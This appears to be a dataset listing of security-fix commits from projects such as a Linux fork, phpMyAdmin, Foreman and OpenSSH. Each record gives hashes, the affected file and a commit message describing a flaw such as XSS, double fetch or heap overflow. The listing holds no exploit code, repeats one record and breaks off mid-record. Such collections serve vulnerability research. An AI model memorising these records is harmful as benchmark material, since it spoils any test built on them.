    8fdd27b173061def484663beeace691a8bfa2365
    c124c3c12f7c5c848d11e2a59d9e17ba93597411
    d4c51158470f5afb7cee8a5c875b5f9ed5b04e14
    d6c8f4cd080001a527f7c137021cc6a3f3604344
    f501ac0483665aeb1100e2f2776d3f38610e9b30
Projects:
    0-T-0_ps4-linux
Commit Message for 75ff39ccc1bd5d3c455b6822ab09e533c551f758:
tcp: make challenge acks less predictable\n\nYue Cao claims that current host rate limiting of challenge ACKS (RFC 5961) could leak enough information to allow a patient attacker to hijack TCP sessions. He will soon provide details in an academic paper.\n\nThis patch increases the default limit from 100 to 1000, and adds some randomization so that the attacker can no longer hijack sessions without spending a considerable amount of probes.\n\nBased on initial analysis and patch from Linus.\n\nNote that we also have per socket rate limiting, so it is tempting to remove the host limit in the future.\n\nv2: randomize the count of challenge acks per second, not the period.\n\nFixes: 282f23c6ee34 ("tcp: implement RFC 5961 3.2") Reported-by: Yue Cao <ycao009@ucr.edu> Signed-off-by: Eric Dumazet <edumazet@google.com> Suggested-by: Linus Torvalds <torvalds@linux-foundation.org> Cc: Yuchung Cheng <ycheng@google.com> Cc: Neal Cardwell <ncardwell@google.com> Acked-by: Neal Cardwell <ncardwell@google.com> Acked-by: Yuchung Cheng <ycheng@google.com> Signed-off-by: David S. Miller <davem@davemloft.net>

======================================================================
Commit With Fix: 
    1dca386505f396f0c2035112a403cc80768a141f
File(s) In Commit: 
    setup/frames/index.inc.php
Blob(s) In Commit: 
    d28305a6909d05fed0a15c67ff1a5f18120d4d7f
Blob(s) Before Fix: 
    ed6902a53fd9a69628b163899d1c862c5df978c1
Projects:
    007durgesh219_phpmyadmin
Commit Message for 1dca386505f396f0c2035112a403cc80768a141f:
Use javascript for redirection to https\n\nThe current approach is broken since whitelisting is active in url.php and also allows potential bbcode injection.\n\nSigned-off-by: Michal Čihař <michal@cihar.com>

======================================================================
Commit With Fix: 
    ef6c66dca1b0cb0a1a482477938cfc859d2baee3
File(s) In Commit: 
    libraries/central_columns.lib.php
Blob(s) In Commit: 
    6306e3f40302bfce0f10668c868fbd7a449adbaf
Blob(s) Before Fix: 
    030e7c77197ee9670f8cf746901a5697cb69cc0d
    13de8d70e6350815cd420d156c1157d722fcde7b
    743913acc04d41bf52221cb206bfa0464db48995
    7e90e8ab1114e5fc8a93c647ffea227efaef1203
    ea8012fbe8311fc5f1bed6b9ef864bc33541e2cf
Projects:
    007durgesh219_phpmyadmin
Commit Message for ef6c66dca1b0cb0a1a482477938cfc859d2baee3:
Properly escape database name in central column queries\n\nSigned-off-by: Michal Čihař <michal@cihar.com>

======================================================================
Commit With Fix: 
    72213573182896bd6a6e5af5ba1881dd87c4a20b
File(s) In Commit: 
    templates/table/structure/display_table_stats.phtml
Blob(s) In Commit: 
    04839f6f178c2551e4bba0b134c1a015ab8be8f2
Blob(s) Before Fix: 
    c483e95ebf7c2061a6825be3bee75dd6956aa773
Projects:
    007durgesh219_phpmyadmin
Commit Message for 72213573182896bd6a6e5af5ba1881dd87c4a20b:
Fix XSS on table structure\n\nSigned-off-by: Michal Čihař <michal@cihar.com>

======================================================================
Commit With Fix: 
    4767f24ea4c1e3822ce71a636c341e8ad8d07aa6
File(s) In Commit: 
    js/get_scripts.js.php
Blob(s) In Commit: 
    06705c5d4ea030932a66a029448168311ac5ba8c
Blob(s) Before Fix: 
    564fda7dd2b438ff235c2965c88031867d0eb9bb
    742213e0f11f9c548d6fc5d6d49386c6b22bc5b4
    8e828c91cc92e11d6f29a71960faa68f592338e5
    b1430bc4b9c24bb5bfed44105f018112e7db8a4a
    b6ad2b40061b2b3ac1d4c678eb9e212970439251
    fdeddf4c3bb6f2e9f1da4c4198e8619bda69ef3c
    fe2f8a295a597c3c4612c3757d914f3acefc06cb
Projects:
    007durgesh219_phpmyadmin
Commit Message for 4767f24ea4c1e3822ce71a636c341e8ad8d07aa6:
Limit number of included scripts in get_scripts.js.php\n\nThis avoids potential DOS, the limit is same as we use for generating the URLs.\n\nSigned-off-by: Michal Čihař <michal@cihar.com>

======================================================================
Commit With Fix: 
    9bf292bfca94694a721449e3fd752493856710f6
File(s) In Commit: 
    drivers/misc/mic/vop/vop_vringh.c
Blob(s) In Commit: 
    88e45234d527518e0d449d598c5f04a5be5538a1
Blob(s) Before Fix: 
    af57d2caac750a8cdf4b1d3e739bdf37d977ebf3
    e94c7fb6712aab35a1a3278241c3bab494f68777
    fed992e2c2583907711a056ed54bc87a0888d532
Projects:
    0-T-0_ps4-linux
Commit Message for 9bf292bfca94694a721449e3fd752493856710f6:
misc: mic: Fix for double fetch security bug in VOP driver\n\nThe MIC VOP driver does two successive reads from user space to read a variable length data structure. Kernel memory corruption can result if the data structure changes between the two reads. This patch disallows the chance of this happening.\n\nBugzilla: https://bugzilla.kernel.org/show_bug.cgi?id=116651 Reported by: Pengfei Wang <wpengfeinudt@gmail.com> Reviewed-by: Sudeep Dutt <sudeep.dutt@intel.com> Signed-off-by: Ashutosh Dixit <ashutosh.dixit@intel.com> Cc: stable <stable@vger.kernel.org> Signed-off-by: Greg Kroah-Hartman <gregkh@linuxfoundation.org>

======================================================================
Commit With Fix: 
    b7c217680cda02dddced245d237ebe8c383be285
File(s) In Commit: 
    rwpng.c
Blob(s) In Commit: 
    e3f59d11007489f2ad5f9af11d86c1f060f26ca0
Blob(s) Before Fix: 
    8a0c1f77aa7c814600bba77a10278876c6dc1cad
    aeb4696a770c1114ddc395932333aca6d7814721
    aff6d4e85dbd2dee6cad88671cc94defd36319ae
Projects:
    7snovic_pngquant
Commit Message for b7c217680cda02dddced245d237ebe8c383be285:
Fix integer overflow in rwpng.h (CVE-2016-5735)\n\nReported by Choi Jaeseung  Found with Sparrow (http://ropas.snu.ac.kr/sparrow)

======================================================================
Commit With Fix: 
    8573c2ee172f66c1667de49685c88fdc8883ca8b
File(s) In Commit: 
    templates/gerrit.config.erb
Blob(s) In Commit: 
    1c922e0b1178a22664a75f6a2d4a851d9f46cfc3
Blob(s) Before Fix: 
    c707f6c96db0d9060ae015f760c1a42a9c0dceba
Projects:
    131_puppetlabs-apache
Commit Message for 8573c2ee172f66c1667de49685c88fdc8883ca8b:
Remove text/html as a safe mimetype\n\nThe non-default safe mimetype in gerrit exists purely to proect installs against setting this - when set, downloading a text/html file will result in that file being rendered.\n\nChange-Id: I648ada0b26aaf35ece9ef57f609b46f23f6e422a

======================================================================
Commit With Fix: 
    93a2001bdfd5376c3dc2158653034c20392d15c5
File(s) In Commit: 
    drivers/hid/usbhid/hiddev.c
Blob(s) In Commit: 
    700145b1508894f30a018aef278d15cfc458ef3a
Blob(s) Before Fix: 
    14599e25679181cc00223675a7d4170cdff70174
    26b7d1f28b1bf3e8d018a50f041c3169ca84fe33
    2f1ddca6f2e0a3a4712bce434d5b29e1556e216c
    308d8432fea3650abc3ddde473472d78a4cd1e0e
    39bae170a55b85ca38b764221ea0e280dc554db1
    4ad880d25822c6f8cf7784db7db34b81bf4a3d69
    4ef02b269a71d5277838c83a74eedeac0391cd80
    602f16373179cf8213b6db9b6adbc3c6d58cd2c3
    774bd701dae0b82f4eecd662250cd4155c82dd4f
    7c297d305d5dd42f7399eadb33e624fd9a6a0a69
    89761551c15d6b952ce10f85dfb463859933e712
    8b6ee247bfe47d0068897a7c59f005238a6613e4
    8ffc682fb94530cdb1154fc1f13ab6491453c6d0
    a5e1eca8819de795f5b872d01915ba5b4013d018
    b1ec0e2aeb57b0b26a66e17b067192cfc30689c1
    b2c60ec26d30bf53e33643bb93e6fdac521f9662
    b59b15d4caa9638dd3a601442af4bfe71bf8f736
    cbba544a68afb31082be0547cc1d09ca932bae51
    da8fd9580223340a4ab9694fe237ff2974a0449e
Projects:
    0-T-0_ps4-linux
Commit Message for 93a2001bdfd5376c3dc2158653034c20392d15c5:
HID: hiddev: validate num_values for HIDIOCGUSAGES, HIDIOCSUSAGES commands\n\nThis patch validates the num_values parameter from userland during the HIDIOCGUSAGES and HIDIOCSUSAGES commands. Previously, if the report id was set to HID_REPORT_ID_UNKNOWN, we would fail to validate the num_values parameter leading to a heap overflow.\n\nCc: stable@vger.kernel.org Signed-off-by: Scott Bauer <sbauer@plzdonthack.me> Signed-off-by: Jiri Kosina <jkosina@suse.cz>

======================================================================
Commit With Fix: 
    3ad08e01b4d253c66ae56414886089684155af22
File(s) In Commit: 
    libarchive/archive_read_support_format_iso9660.c
Blob(s) In Commit: 
    f41ba386562365a536c15fb980dbde08c7a5a131
Blob(s) Before Fix: 
    0c640c88e86741227dc72aa47ceb9e9b34acd016
    6934ceefe9db20b808aaf0d817b1bd904f511284
    8a34f2a7100413f76897f7a9ebfd8b8e3ab50da6
    914bc71dfed546710f9d512abd8ec2b0986a05d2
    ab887505ce17f365dcbfeb5e8a98199bf252556d
Projects:
    AasemShokr_libarchive
Commit Message for 3ad08e01b4d253c66ae56414886089684155af22:
Issue 717:  Fix integer overflow when computing location of volume descriptor\n\nThe multiplication here defaulted to 'int' but calculations of file positions should always use int64_t.  A simple cast suffices to fix this since the base location is always 32 bits for ISO, so multiplying by the sector size will never overflow a 64-bit integer.

======================================================================
Commit With Fix: 
    532c34b5fbf1687df63b3fcd5b2846312ac943c6
File(s) In Commit: 
    drivers/s390/char/sclp_ctl.c
Blob(s) In Commit: 
    ea607a4a1bddaf3e41165aebed1fd787b87d754e
Blob(s) Before Fix: 
    248b5db3eaa8c0de73caf360b45f5690453c675d
    554eaa1e347de5125cc4c52d7cb1f24abb4e706a
    648cb86afd427776abc0d109f0982284d094699a
Projects:
    0-T-0_ps4-linux
Commit Message for 532c34b5fbf1687df63b3fcd5b2846312ac943c6:
s390/sclp_ctl: fix potential information leak with /dev/sclp\n\nThe sclp_ctl_ioctl_sccb function uses two copy_from_user calls to retrieve the sclp request from user space. The first copy_from_user fetches the length of the request which is stored in the first two bytes of the request. The second copy_from_user gets the complete sclp request, but this copies the length field a second time. A malicious user may have changed the length in the meantime.\n\nReported-by: Pengfei Wang <wpengfeinudt@gmail.com> Reviewed-by: Michael Holzheu <holzheu@linux.vnet.ibm.com> Signed-off-by: Martin Schwidefsky <schwidefsky@de.ibm.com>

======================================================================
Commit With Fix: 
    43761473c254b45883a64441dd0bc85a42f3645c
File(s) In Commit: 
    kernel/auditsc.c
Blob(s) In Commit: 
    c65af21a12d6d2e7b56e99ed2fdd6d284a9ec43a
Blob(s) Before Fix: 
    aa3feec4df148ff5f007e8eea7ff55cbbda5b165
Projects:
    0-T-0_ps4-linux
Commit Message for 43761473c254b45883a64441dd0bc85a42f3645c:
audit: fix a double fetch in audit_log_single_execve_arg()\n\nThere is a double fetch problem in audit_log_single_execve_arg() where we first check the execve(2) argumnets for any "bad" characters which would require hex encoding and then re-fetch the arguments for logging in the audit record[1].  Of course this leaves a window of opportunity for an unsavory application to munge with the data.\n\nThis patch reworks things by only fetching the argument data once[2] into a buffer where it is scanned and logged into the audit records(s).  In addition to fixing the double fetch, this patch improves on the original code in a few other ways: better handling of large arguments which require encoding, stricter record length checking, and some performance improvements (completely unverified, but we got rid of some strlen() calls, that's got to be a good thing).\n\nAs part of the development of this patch, I've also created a basic regression test for the audit-testsuite, the test can be tracked on GitHub at the following link:\n\n * https://github.com/linux-audit/audit-testsuite/issues/25\n\n[1] If you pay careful attention, there is actually a triple fetch problem due to a strnlen_user() call at the top of the function.\n\n[2] This is a tiny white lie, we do make a call to strnlen_user() prior to fetching the argument data.  I don't like it, but due to the way the audit record is structured we really have no choice unless we copy the entire argument at once (which would require a rather wasteful allocation).  The good news is that with this patch the kernel no longer relies on this strnlen_user() value for anything beyond recording it in the log, we also update it with a trustworthy value whenever possible.\n\nReported-by: Pengfei Wang <wpengfeinudt@gmail.com> Cc: <stable@vger.kernel.org> Signed-off-by: Paul Moore <paul@paul-moore.com>

======================================================================
Commit With Fix: 
    096cdc6f52225835ff503f987a0d68ef770bb78e
File(s) In Commit: 
    drivers/platform/chrome/cros_ec_dev.c
Blob(s) In Commit: 
    8abd80dbcbed7974b4ace4265dd9dad1bca89edd
Blob(s) Before Fix: 
    2b331d5b9e79982f79680ca290064ec7589669d0
    47268ecedc4dd7474ca4b9f789c39f5290ed98aa
    5b9c8e9ace32de4363fd1e91bbcf015d02031e3b
    6090d0b2826fa1b9502ed47b87f10f9dd9a06a08
    6d8ee3b1587276494274617d65029534df1d1af6
    6f09da4dadb8877e2eec9d705e60e8f46c93116e
    cf6c4f0846b84f111c3d788315ad729e017966fc
    d45cd254ed1c8f295292074100934130235fca64
    e8fcdc237029a97908194a52b668ad0c4aa6920c
Projects:
    0-T-0_ps4-linux
Commit Message for 096cdc6f52225835ff503f987a0d68ef770bb78e:
platform/chrome: cros_ec_dev - double fetch bug in ioctl\n\nWe verify "u_cmd.outsize" and "u_cmd.insize" but we need to make sure that those values have not changed between the two copy_from_user() calls.  Otherwise it could lead to a buffer overflow.\n\nAdditionally, cros_ec_cmd_xfer() can set s_cmd->insize to a lower value. We should use the new smaller value so we don't copy too much data to the user.\n\nReported-by: Pengfei Wang <wpengfeinudt@gmail.com> Fixes: a841178445bb ('mfd: cros_ec: Use a zero-length array for command data') Signed-off-by: Dan Carpenter <dan.carpenter@oracle.com> Reviewed-by: Kees Cook <keescook@chromium.org> Tested-by: Gwendal Grignou <gwendal@chromium.org> Cc: <stable@vger.kernel.org> # v4.2+ Signed-off-by: Olof Johansson <olof@lixom.net>

======================================================================
Commit With Fix: 
    30a46a4647fd1df9cf52e43bf467f0d9265096ca
File(s) In Commit: 
    security/apparmor/lsm.c
Blob(s) In Commit: 
    7798e1608f4f4bb429c94017e2c6f73b07a7afc9
Blob(s) Before Fix: 
    02cc952b86aad085ac3dad3b5d9f89911b1256a1
    107db88b1d5f9d1d5dda20c0636f229738fec8bd
    2660fbcf94d1e0e8affa72d4656584bc0aa06216
    37fe3575bda8fa681313134765446d7769b55af7
    4257b7e2796bf16e41db9ddca0e1f7c8e0d08a02
    5ee820111027edc32ae6b3535d4ce9a4b5ca7ee8
    65ca451a764db1a38db4c8a68be1acd015f14d4f
    998100093332a1390d1bc26b07eab91307fa2917
    dec607c17b6434d6b8e5416060a0202bc4cb52f4
    e5f1561439dbe016bcaaf4c7ffe00516e0550b8d
Projects:
    0-T-0_ps4-linux
Commit Message for 30a46a4647fd1df9cf52e43bf467f0d9265096ca:
apparmor: fix oops, validate buffer size in apparmor_setprocattr()\n\nWhen proc_pid_attr_write() was changed to use memdup_user apparmor's (interface violating) assumption that the setprocattr buffer was always a single page was violated.\n\nThe size test is not strictly speaking needed as proc_pid_attr_write() will reject anything larger, but for the sake of robustness we can keep it in.\n\nSMACK and SELinux look safe to me, but somebody else should probably have a look just in case.\n\nBased on original patch from Vegard Nossum <vegard.nossum@oracle.com> modified for the case that apparmor provides null termination.\n\nFixes: bb646cdb12e75d82258c2f2e7746d5952d3e321a Reported-by: Vegard Nossum <vegard.nossum@oracle.com> Cc: Al Viro <viro@zeniv.linux.org.uk> Cc: John Johansen <john.johansen@canonical.com> Cc: Paul Moore <paul@paul-moore.com> Cc: Stephen Smalley <sds@tycho.nsa.gov> Cc: Eric Paris <eparis@parisplace.org> Cc: Casey Schaufler <casey@schaufler-ca.com> Cc: stable@kernel.org Signed-off-by: John Johansen <john.johansen@canonical.com> Reviewed-by: Tyler Hicks <tyhicks@canonical.com> Signed-off-by: James Morris <james.l.morris@oracle.com>

======================================================================
Commit With Fix: 
    11f3710417d026ea2f4fcf362d866342c5274185
File(s) In Commit: 
    fs/overlayfs/dir.c
Blob(s) In Commit: 
    bc1758a160f6d7e857d43294c2c6656ca122a537
Blob(s) Before Fix: 
    52f6de5d40a9211baa29a39fc2a178598a86a92f
Projects:
    0-T-0_ps4-linux
Commit Message for 11f3710417d026ea2f4fcf362d866342c5274185:
ovl: verify upper dentry before unlink and rename\n\nUnlink and rename in overlayfs checked the upper dentry for staleness by verifying upper->d_parent against upperdir.  However the dentry can go stale also by being unhashed, for example.\n\nExpand the verification to actually look up the name again (under parent lock) and check if it matches the upper dentry.  This matches what the VFS does before passing the dentry to filesytem's unlink/rename methods, which excludes any inconsistency caused by overlayfs.\n\nSigned-off-by: Miklos Szeredi <mszeredi@redhat.com>

======================================================================
Commit With Fix: 
    b589096f907052b3a4da2b9ccc9b0e2e888dfc18
File(s) In Commit: 
    src/network.c
Blob(s) In Commit: 
    5c7761d36faa0d0cdc03fb53bb65ae1ed7e388d6
Blob(s) Before Fix: 
    0ee6ed0b9834f96a9ad1cd885657c0e5f9719c89
Projects:
    01BTC10_collectd
Commit Message for b589096f907052b3a4da2b9ccc9b0e2e888dfc18:
network plugin: Fix heap overflow in parse_packet().\n\nEmilien Gaspar has identified a heap overflow in parse_packet(), the function used by the network plugin to parse incoming network packets.\n\nThis is a vulnerability in collectd, though the scope is not clear at this point. At the very least specially crafted network packets can be used to crash the daemon. We can't rule out a potential remote code execution though.\n\nFixes: CVE-2016-6254

======================================================================
Commit With Fix: 
    eb5be5bd94c8cae1d7f3ba9801377084d8e5a7ba
File(s) In Commit: 
    jwcrypto/jwa.py
Blob(s) In Commit: 
    521890bae483682790efa9e0af95a6e1565a4ea1
Blob(s) Before Fix: 
    c61c46a903abf675e478e6b0c2825a8516335a05
Projects:
    alex_jwcrypto
Commit Message for eb5be5bd94c8cae1d7f3ba9801377084d8e5a7ba:
CVE-2016-6298: Million Messages Attack mitigation\n\nRFC 3218 describes an oracle attack called Million Messages Attack against RSA with PKCS1 v1.5 padding.\n\nDepending on how JWEs are used a server may become an Oracle, and the mitigation presecribed in RFC 3218 2.3.2 need to be implemented.\n\nMany thanks to Dennis Detering for his responsible disclosure and help verifying the mitigation approach.\n\nResolves #65 Signed-off-by: Simo Sorce <simo@redhat.com> Closes #66

======================================================================
Commit With Fix: 
    0f35fe14acf0d0d3b55e9337bc5e2b9640ff2372
File(s) In Commit: 
    app/helpers/form_helper.rb
Blob(s) In Commit: 
    2e7d451fb2ef974f539c4f2eb24eb1bf606f2df5
Blob(s) Before Fix: 
    0db9635a046b6206dfd88c99e7bae402e17e90e4
Projects:
    0-T-0_foreman
Commit Message for 0f35fe14acf0d0d3b55e9337bc5e2b9640ff2372:
Fixes #16024 - escape labels of form fields

======================================================================
Commit With Fix: 
    850c38451c7bbde75521b796d16aca26e4d240a0
File(s) In Commit: 
    app/assets/javascripts/host_edit_interfaces.js
Blob(s) In Commit: 
    fcc720d260dc67b9968bfd434663b721cd57dd8f
Blob(s) Before Fix: 
    1f77a527e63048559a435d7c214983d2a350399c
    2d411d3c5d8068041264709be4d0bd4ed6736a92
    3b990515b8628954a56029dfac31d6ef93d407a4
    437c872563510b6749b69eba374e457a985b61dd
    46c54fd2b397e65666403925a7827e11b82d24dd
    593243106cfed88024e472395d9aaf8df1d2543b
    73e947c7da532314aa8da9f08d9d03910c38da20
    80e141f361f760191d82267e6696f2a0f22fe7f0
    81c535bb45070879e2fdd163604585d69bc5bc99
    9f439a1ca6902310ec91ea710a299c2f6bc0bffc
    a51c4b22c3a62638f0ea583c73b8bfe8c51c28dd
    a64909dc77729c384927d2dc1c4d34f2116b950a
    ee7b75704827b8792ed88bc8cea9e9ea475601d5
    f1aeb58b300805bfc9dce9f259a5be716ce148d3
    fe88535f0b0b19bb619ad96b22a1e0f2beb4d667
Projects:
    0-T-0_foreman
Commit Message for 850c38451c7bbde75521b796d16aca26e4d240a0:
Fixes #16022 - Prevent stored XSS in host interface form\n\nThe host interface form may contain a stored XSS in the identifier field allowing a user allowed to edit a host's interfaces to cause code execution by another user viewing that host's edit form.

======================================================================
Commit With Fix: 
    51093254bf879bc9ce96590400a87897c7498463
File(s) In Commit: 
    drivers/infiniband/ulp/srpt/ib_srpt.c
Blob(s) In Commit: 
    4328679a67a76792694a3e1169bc4e7bdac10d2f
Blob(s) Before Fix: 
    0c37fee363b1d60eb3dd63ebfdc6330b2e14b562
    2e2fe818ca9f1acc42d74c8f4d0e0cfbaf810172
    540cd9366093d61e8dfc980c2de8a917d2c8af87
    9a3b954e862d0a1e792881284994dcac749574df
Projects:
    0-T-0_ps4-linux
Commit Message for 51093254bf879bc9ce96590400a87897c7498463:
IB/srpt: Simplify srpt_handle_tsk_mgmt()\n\nLet the target core check task existence instead of the SRP target driver. Additionally, let the target core check the validity of the task management request instead of the ib_srpt driver.\n\nThis patch fixes the following kernel crash:\n\nBUG: unable to handle kernel NULL pointer dereference at 0000000000000001 IP: [<ffffffffa0565f37>] srpt_handle_new_iu+0x6d7/0x790 [ib_srpt] Oops: 0002 [#1] SMP Call Trace:  [<ffffffffa05660ce>] srpt_process_completion+0xde/0x570 [ib_srpt]  [<ffffffffa056669f>] srpt_compl_thread+0x13f/0x160 [ib_srpt]  [<ffffffff8109726f>] kthread+0xcf/0xe0  [<ffffffff81613cfc>] ret_from_fork+0x7c/0xb0\n\nSigned-off-by: Bart Van Assche <bart.vanassche@sandisk.com> Fixes: 3e4f574857ee ("ib_srpt: Convert TMR path to target_submit_tmr") Tested-by: Alex Estrin <alex.estrin@intel.com> Reviewed-by: Christoph Hellwig <hch@lst.de> Cc: Nicholas Bellinger <nab@linux-iscsi.org> Cc: Sagi Grimberg <sagig@mellanox.com> Cc: stable <stable@vger.kernel.org> Signed-off-by: Doug Ledford <dledford@redhat.com>

======================================================================
Commit With Fix: 
    a5cbe929ac3255d371e698f62dc256afe7006466
File(s) In Commit: 
    src/flex.skl
Blob(s) In Commit: 
    64f853dce6e8663837cadcf97f4ad5070db62832
Blob(s) Before Fix: 
    36a526a2a8f46bf9e5e98ca01ac47c8dd3aa8ca1
Projects:
    0-wiz-0_flex
Commit Message for a5cbe929ac3255d371e698f62dc256afe7006466:
Fixed incorrect integer type

======================================================================
Commit With Fix: 
    dd84447b63a71fa8c3f47071b09454efc667767b
File(s) In Commit: 
    MagickCore/property.c
Blob(s) In Commit: 
    0b4b75c4941eea2d9d09b40d2fbbacb6c9f32094
Blob(s) Before Fix: 
    772f3d59fe14ab87ed211549c64beefe01eef4f6
Projects:
    2016repotsheyue_ImageMagick
Commit Message for dd84447b63a71fa8c3f47071b09454efc667767b:
Prevent buffer overflow (bug report from Ibrahim el-sayed)

======================================================================
Commit With Fix: 
    fcd135c9df440bcd2d5870405ad3311743d78d97
File(s) In Commit: 
    auth-passwd.c
Blob(s) In Commit: 
    996c2cf71b002281181190300d90d20173ea6a30
Blob(s) Before Fix: 
    530b5d4f7122963c99dd8e6b369adc8e7c8b5353
    63ccf3cabe7d766b310c5b0f9b57433820a2d050
    68bbd18ddd9721dae4ad969e930b49b57999dbb5
    f6825ecc06553b10201ee1998af3281461777494
Projects:
    0-T-0_docker
    0neday_openssh-portable
Commit Message for fcd135c9df440bcd2d5870405ad3311743d78d97:
upstream commit\n\nSkip passwords longer than 1k in length so clients can't easily DoS sshd by sending very long passwords, causing it to spend CPU hashing them. feedback djm@, ok markus@.\n\nBrought to our attention by tomas.kuthan at oracle.com, shilei-c at 360.cn and coredump at autistici.org\n\nUpstream-ID: d0af7d4a2190b63ba1d38eec502bc4be0be9e333

======================================================================
Commit With Fix: 
    10eec60ce79187686e052092e5383c99b4420a20
File(s) In Commit: 
    fs/ioctl.c
Blob(s) In Commit: 
    0f56deb24ce6547c1aaa13e6a731779c09047077
Blob(s) Before Fix: 
    116a333e9c773c10b76a8030c268284869c2533e
    5d01d2638ca5482cc4edb2144be7ba3fc5f16aa4
    c415668c86d4cc727460ae0f0eb5a6d1f5840f61
Projects:
    0-T-0_ps4-linux
Commit Message for 10eec60ce79187686e052092e5383c99b4420a20:
vfs: ioctl: prevent double-fetch in dedupe ioctl\n\nThis prevents a double-fetch from user space that can lead to to an undersized allocation and heap overflow.\n\nFixes: 54dbc1517237 ("vfs: hoist the btrfs deduplication ioctl to the vfs") Signed-off-by: Scott Bauer <sbauer@plzdonthack.me> Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>

======================================================================
Commit With Fix: 
    5aaab1a49679c26dbcb6fb6dc25799950d70cc71
File(s) In Commit: 
    usr/src/uts/intel/ia32/ml/copy.s
Blob(s) In Commit: 
    7593de374e4fa9cdc1e6c32d376c1ef7fec23f51
Blob(s) Before Fix: 
    35414743a918aeb4d26de8b8cb7ef156e3b4da29
    6c2a15009afd93d27c29064973bd46bd437e0a1f
    aaf148350686aff8120f6662d3a9a2d812d3dc1e
Projects:
    0rbiter_zfs
Commit Message for 5aaab1a49679c26dbcb6fb6dc25799950d70cc71:
7488 bcopy and bzero should mind signed bits Reviewed by: Jerry Jelinek <jerry.jelinek@joyent.com> Reviewed by: Patrick Mooney <patrick.mooney@joyent.com> Approved by: Richard Lowe <richlowe@richlowe.net>

======================================================================
Commit With Fix: 
    f63a8daa5812afef4f06c962351687e1ff9ccb2b
File(s) In Commit: 
    kernel/events/core.c
Blob(s) In Commit: 
    417a96bf3d417d9f38b4a74079165261d7958265
Blob(s) Before Fix: 
    b358cb38e4a550ec50559d1bb05f17c641b97f4e
Projects:
    0-T-0_ps4-linux
Commit Message for f63a8daa5812afef4f06c962351687e1ff9ccb2b:
perf: Fix event->ctx locking\n\nThere have been a few reported issues wrt. the lack of locking around changing event->ctx. This patch tries to address those.\n\nIt avoids the whole rwsem thing  and while it appears to work, please give it some thought in review.\n\nWhat I did fail at is sensible runtime checks on the use of event->ctx, the RCU use makes it very hard.\n\nSigned-off-by: Peter Zijlstra (Intel) <peterz@infradead.org> Cc: Paul E. McKenney <paulmck@linux.vnet.ibm.com> Cc: Jiri Olsa <jolsa@redhat.com> Cc: Arnaldo Carvalho de Melo <acme@kernel.org> Cc: Linus Torvalds <torvalds@linux-foundation.org> Link: http://lkml.kernel.org/r/20150123125834.209535886@infradead.org Signed-off-by: Ingo Molnar <mingo@kernel.org>

======================================================================
Commit With Fix: 
    f63a8daa5812afef4f06c962351687e1ff9ccb2b
File(s) In Commit: 
    kernel/events/core.c
Blob(s) In Commit: 
    417a96bf3d417d9f38b4a74079165261d7958265
Blob(s) Before Fix: 
    b358cb38e4a550ec50559d1bb05f17c641b97f4e
Projects:
    0-T-0_ps4-linux
Commit Message for f63a8daa5812afef4f06c962351687e1ff9ccb2b:
perf: Fix event->ctx locking\n\nThere have been a few reported issues wrt. the lack of locking around changing event->ctx. This patch tries to address those.\n\nIt avoids the whole rwsem thing  and while it appears to work, please give it some thought in review.\n\nWhat I did fail at is sensible runtime checks on the use of event->ctx, the RCU use makes it very hard.\n\nSigned-off-by: Peter Zijlstra (Intel) <peterz@infradead.org> Cc: Paul E. McKenney <paulmck@linux.vnet.ibm.com> Cc: Jiri Olsa <jolsa@redhat.com> Cc: Arnaldo Carvalho de Melo <acme@kernel.org> Cc: Linus Torvalds <torvalds@linux-foundation.org> Link: http://lkml.kernel.org/r/20150123125834.209535886@infradead.org Signed-off-by: Ingo Molnar <mingo@kernel.org>

======================================================================
Commit With Fix: 
    bb1fceca22492109be12640d49f5ea5a544c6bb4
File(s) In Commit: 
    include/net/tcp.h
Blob(s) In Commit: 
    7717302cab91e1bb18cc42c3f2d4b51f98f3c148
Blob(s) Before Fix: 
    0bcc70f4e1fb7ed574f787d636afaa9a87628d69
    0cab28cd43a9067e731af2d0b2557172e63fe5e9
    590e01a476acc913464322e8e54a1858d78b3bf7
    6db10228113fc0cd2ce876035110dd43c6f0c794
    725405170f0eccec4c45b430cd00e0095f42646c
    8d6b983d509959dcc270b73605bbbcb5835d5885
    ae6468f5c9f373d63d987fb114deba1064bc16d5
    b04bc989ad6c77a7ab214207f536722c2b0321ac
    b91370f61be64a9ef2bcff2d8f20701f5ced09b1
    c00e7d51bb18d77f47ef9fb016ef432f5db4f7be
    f80e74c5ad18b22c274ecd7e75b6a23ffe7268b4
Projects:
    0-T-0_ps4-linux
Commit Message for bb1fceca22492109be12640d49f5ea5a544c6bb4:
tcp: fix use after free in tcp_xmit_retransmit_queue()\n\nWhen tcp_sendmsg() allocates a fresh and empty skb, it puts it at the tail of the write queue using tcp_add_write_queue_tail()\n\nThen it attempts to copy user data into this fresh skb.\n\nIf the copy fails, we undo the work and remove the fresh skb.\n\nUnfortunately, this undo lacks the change done to tp->highest_sack and we can leave a dangling pointer (to a freed skb)\n\nLater, tcp_xmit_retransmit_queue() can dereference this pointer and access freed memory. For regular kernels where memory is not unmapped, this might cause SACK bugs because tcp_highest_sack_seq() is buggy, returning garbage instead of tp->snd_nxt, but with various debug features like CONFIG_DEBUG_PAGEALLOC, this can crash the kernel.\n\nThis bug was found by Marco Grassi thanks to syzkaller.\n\nFixes: 6859d49475d4 ("[TCP]: Abstract tp->highest_sack accessing & point to next skb") Reported-by: Marco Grassi <marco.gra@gmail.com> Signed-off-by: Eric Dumazet <edumazet@google.com> Cc: Ilpo Järvinen <ilpo.jarvinen@helsinki.fi> Cc: Yuchung Cheng <ycheng@google.com> Cc: Neal Cardwell <ncardwell@google.com> Acked-by: Neal Cardwell <ncardwell@google.com> Reviewed-by: Cong Wang <xiyou.wangcong@gmail.com> Signed-off-by: David S. Miller <davem@davemloft.net>

======================================================================
Commit With Fix: 
    7086c2d8b4b20ac14013b36761ac04f0abf21a4e
File(s) In Commit: 
    core/filter_api.php
Blob(s) In Commit: 
    72ac90f1c337946f1f0b695328a6365609bcde09
Blob(s) Before Fix: 
    b1e2d89612f925447a63d411c084a4fc044cf331
Projects:
    01-Scripts_mantisbt
Commit Message for 7086c2d8b4b20ac14013b36761ac04f0abf21a4e:
Fix XSS in view_all_bug_page.php\n\nThe value of the view_type parameter on the view_all_bug_page.php page was not encoded before being displayed.\n\nThis vulnerability was discovered by Will Dollman of Netcraft Ltd.\n\nInitial patch modified to use strict comparison per Will's suggestion.\n\nFixes #21611

======================================================================
Commit With Fix: 
    34b88a68f26a75e4fded796f1a49c40f82234b7d
File(s) In Commit: 
    net/socket.c
Blob(s) In Commit: 
